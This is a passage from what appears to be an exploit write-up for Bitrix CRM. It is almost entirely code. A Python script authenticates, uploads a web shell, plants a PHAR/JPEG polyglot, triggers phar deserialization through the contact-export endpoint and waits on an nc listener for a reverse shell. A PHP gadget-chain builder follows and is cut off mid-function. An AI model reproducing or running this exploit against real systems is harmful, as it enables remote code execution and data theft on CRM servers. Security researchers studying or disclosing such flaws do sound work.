</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;php --define phar.readonly=0 create_phar.php </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./test.phar&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_progress_data</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Setting fake user options&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&#34;BITRIX_SM_LAST_SETTINGS&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">dict_to_str</span><span class="p">(</span><span class="n">nested_to_urlencoded</span><span class="p">([{</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;crm&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;v&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="s2">&#34;FILE_PATH&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;phar://</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">/a&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                <span class="s2">&#34;PROCESS_TOKEN&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="p">},</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;crm_stexport_contact&#34;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}],</span> <span class="s2">&#34;p&#34;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">)</span> <span class="o">|</span> <span class="p">{</span><span class="s2">&#34;sessid&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">}))</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/tools/public_session.php&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_upload_params</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="s2">&#34;/bitrix/components/bitrix/crm.contact.details/ajax.php?sessid=&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">sessid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;FIELD_NAME&#34;</span><span class="p">:</span> <span class="s2">&#34;PHOTO&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ACTION&#34;</span><span class="p">:</span> <span class="s2">&#34;RENDER_IMAGE_INPUT&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ACTION_ENTITY_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">controlUid</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;controlUid&#39;:&#39;([a-f0-9]</span><span class="si">{32}</span><span class="s2">)&#39;&#34;</span><span class="p">),</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">controlSign</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;controlSign&#39;:&#39;([a-f0-9]</span><span class="si">{64}</span><span class="s2">)&#39;&#34;</span><span class="p">),</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">urlUpload</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;urlUpload&#39;:&#39;(.*)&#39;&#34;</span><span class="p">),</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;USER_ID&#39;:&#39;([0-9]+)&#39;&#34;</span><span class="p">),</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">controlUid</span><span class="p">,</span> <span class="n">controlSign</span><span class="p">,</span> <span class="n">urlUpload</span><span class="p">,</span> <span class="n">user_id</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">,</span> <span class="n">controlUid</span><span class="p">,</span> <span class="n">controlSign</span><span class="p">,</span> <span class="n">urlUpload</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="n">urlUpload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Site-Id&#34;</span><span class="p">:</span> <span class="n">SITE_ID</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[file167][name]&#34;</span><span class="p">:</span> <span class="s2">&#34;bitrix-out.jpg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[file167][type]&#34;</span><span class="p">:</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[file167][size]&#34;</span><span class="p">:</span> <span class="s2">&#34;10&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;AJAX_POST&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_ID&#34;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;sessid&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;SITE_ID&#34;</span><span class="p">:</span> <span class="n">SITE_ID</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[controlId]&#34;</span><span class="p">:</span> <span class="s2">&#34;bitrixUploader&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[CID]&#34;</span><span class="p">:</span> <span class="n">controlUid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;cid&#34;</span><span class="p">:</span> <span class="n">controlUid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;moduleId&#34;</span><span class="p">:</span> <span class="s2">&#34;crm&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;allowUpload&#34;</span><span class="p">:</span> <span class="s2">&#34;I&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;uploadMaxFilesize&#34;</span><span class="p">:</span> <span class="s2">&#34;3145728&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[uploadInputName]&#34;</span><span class="p">:</span> <span class="s2">&#34;bxu_files&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[version]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[mode]&#34;</span><span class="p">:</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[filesCount]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[packageIndex]&#34;</span><span class="p">:</span> <span class="s2">&#34;pIndex1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;mfi_mode&#34;</span><span class="p">:</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;mfi_sign&#34;</span><span class="p">:</span> <span class="n">controlSign</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[file167][default]&#34;</span><span class="p">:</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;bitrix-out.jpg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;image/jpg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">full_path</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s2">&#34;files&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">values</span><span class="p">())[</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;thumb_src&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;/upload/resize_cache/crm/([a-f0-9]</span><span class="si">{3}</span><span class="s2">/[a-z0-9]</span><span class="si">{32}</span><span class="s2">)/90_90_2/bitrix-out</span><span class="se">\\</span><span class="s2">.jpg&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">full_path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">trigger_file_exists</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/components/bitrix/crm.contact.list/stexport.ajax.php?sessid=&#34;</span> <span class="o">+</span> <span class="n">sessid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="n">nested_to_urlencoded</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;SITE_ID&#34;</span><span class="p">:</span> <span class="n">SITE_ID</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ENTITY_TYPE_NAME&#34;</span><span class="p">:</span> <span class="s2">&#34;CONTACT&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;EXPORT_TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;csv&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PROCESS_TOKEN&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="s2">&#34;PARAMS&#34;</span><span class="p">)</span> <span class="o">|</span> <span class="p">{</span><span class="s2">&#34;ACTION&#34;</span><span class="p">:</span> <span class="s2">&#34;STEXPORT&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">PROXY</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">USERNAME</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">webshell_path</span> <span class="o">=</span> <span class="n">upload_web_shell</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ROOT_PATH</span> <span class="o">=</span> <span class="n">webshell_path</span><span class="p">[:</span><span class="n">webshell_path</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;upload&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Webshell uploaded to &#39;</span><span class="si">{</span><span class="n">webshell_path</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">controlUid</span><span class="p">,</span> <span class="n">controlSign</span><span class="p">,</span> <span class="n">urlUpload</span><span class="p">,</span> <span class="n">user_id</span> <span class="o">=</span> <span class="n">get_upload_params</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">make_phar</span><span class="p">(</span><span class="n">webshell_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">upload_file</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">,</span> <span class="n">controlUid</span><span class="p">,</span> <span class="n">controlSign</span><span class="p">,</span> <span class="n">urlUpload</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">ROOT_PATH</span><span class="si">}</span><span class="s2">upload/crm/</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">/bitrix-out.jpg&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] PHAR uploaded to &#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">set_progress_data</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Triggering file_exists phar deserialization&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">trigger_file_exists</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Waiting for reverse shell connection&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&#34;nc&#34;</span><span class="p">,</span> <span class="s2">&#34;-nvlp&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">PORT</span><span class="p">)])</span>
</span></span></code></pre></div><p>The following PHP files also need to be present in the same directory:</p>
<p><code>create_phar.php</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Bitrix\Bizproc\Activity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Bitrix\Bizproc\FieldType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Bitrix\Main\ArgumentException</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;./CCloudsDebug.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">CCloudsDebug</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PropertiesDialog</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$activityFile</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$dialogFileName</span> <span class="o">=</span> <span class="s1">&#39;properties_dialog.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$map</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$mapCallback</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$documentType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$activityName</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$workflowTemplate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$workflowParameters</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$workflowVariables</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$currentValues</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$formName</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$siteId</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$renderer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$context</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$runtimeData</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">renderer</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">renderer</span><span class="p">,</span> <span class="nv">$this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$runtime</span> <span class="o">=</span> <span class="nx">\CBPRuntime</span><span class="o">::</span><span class="na">getRuntime</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$runtime</span><span class="o">-&gt;</span><span class="na">startRuntime</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$runtime</span><span class="o">-&gt;</span><span class="na">executeResourceFile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">activityFile</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dialogFileName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nx">array_merge</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">				<span class="s1">&#39;dialog&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				<span class="c1">//compatible parameters
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="s1">&#39;arCurrentValues&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCurrentValues</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dialogFileName</span> <span class="o">===</span> <span class="s1">&#39;properties_dialog.php&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">				<span class="s1">&#39;formName&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFormName</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">				<span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRuntimeData</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">			<span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$cloudDebug</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CCloudsDebug</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$dialog</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PropertiesDialog</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$dialog</span><span class="o">-&gt;</span><span class="na">dialogFileName</span> <span class="o">=</span> <span class="s2">&#34;stexport.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dialog</span><span class="o">-&gt;</span><span class="na">runtimeData</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;path&#34;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;&#34;</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$cloudDebug</span><span class="o">-&gt;</span><span class="na">head</span> <span class="o">=</span> <span class="nv">$dialog</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">generate_base_phar</span><span class="p">(</span><span class="nv">$o</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$tempname</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tempname</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Phar</span><span class="p">(</span><span class="nv">$tempname</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$basecontent</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tempname</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tempname</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$basecontent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">generate_polyglot</span><span class="p">(</span><span class="nv">$phar</span><span class="p">,</span> <span class="nv">$jpeg</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$phar</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span> <span class="c1">// remove &lt;?php dosent work with prefix
